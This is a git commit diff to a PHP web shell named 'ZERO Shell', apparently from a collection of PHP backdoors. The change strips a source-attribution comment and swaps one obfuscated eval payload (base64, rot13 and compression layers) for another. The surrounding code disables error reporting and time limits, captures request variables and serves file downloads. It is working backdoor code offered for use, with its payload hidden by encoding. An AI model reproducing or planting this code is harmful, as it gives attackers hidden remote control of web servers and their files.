b885578a2aa90d8ac8a51c42318ae7f894c7c6ff
User of Github <84887432+1337r0j4n@users.noreply.github.com>
2024-01-21 21:35:14 +0630

    Add files via upload

--- SHELLs/ZERO Shell/zero.php
+++ SHELLs/ZERO Shell/zero.php
@@ -1,5 +1,4 @@
 <?php
-// from https://github.com/1337r0j4n/php-backdoors
 set_time_limit(0);
 error_reporting(0);
 ini_set('display_errors', FALSE);
@@ -15,7 +14,7 @@ if (function_exists("get_defined_vars")) {
   $GLOBALS["zero_post"] = $_POST;
   $GLOBALS["zero_server"] = $_SERVER;
   $GLOBALS["zero_files"] = $_FILES;
-}; eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBEeIMwEIDf/RVOhCh1XO3TLB2sndq9jOHDHiYSWaYRW6yeWiD++rWm0MHyktx93GqXZksrayvQFjk0zZP3PCmwuenrx2qOWFGQHdvkP97vknnBD5LkYoc8zegh+cLlxpqUBm0BTgdJCahR428pBI/DY/UckTWJojVMPYWXV8lTVh51DbI5UFS45NhURq8b8EQjd+h04zheXddVgFtL6G0WH1PbF3Fvk4N+hBqjW9r+NK0DZOIQo55mrYZeKEmFx6DrumBv9Ry0tYZ3YCOMtv/wzCAkG40H72p2hv/A+5eW3rch6LlIbaQ/LdQnt8BzqwtozLv0WWjpW6Xnen4B')))));
+}; eval(gzuncompress(str_rot13(base64_decode('a5xIQ1p4hEAM/SuDLFHBj7XQpUishyJ5Qt2q24vIYDWugjrTZMRdV/97VO2hhUDyXmvJWEMIJqhAzoR5h4u+N3yym1EX6DuaUfF7FHRjWdNGAmwYAqt4MIIgADZACI2UfARizWB4nuN8/RfR43iST/79h46jt2aUpPQcv6iG5pO67ZBeQ9KSDRIHOerrPDXs3rUPD7Z7a7Tv3L1GjqPNGw4mqYthUZOMRWDRYrKrkiskRM/Ic4cEQnGpsahDrFV73hZL8sbRIwXnXVsWsnKDZrXmbLZ3Jm1YnY5QySqsNJNAj7Ju1SqH02WL4n59ruSyin5ZekrRzwnFWs+AWpJCW2r5cGGYJEpuGP4PeTtnqg=='))));
 $GLOBALS["zero_os"] = (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux"; 
 if(isset($GLOBALS["zero_get"]['file']) && ($GLOBALS["zero_get"]['file'] != '') && ($GLOBALS["zero_get"]['zero_act'] == 'download')) {
   @ob_clean();
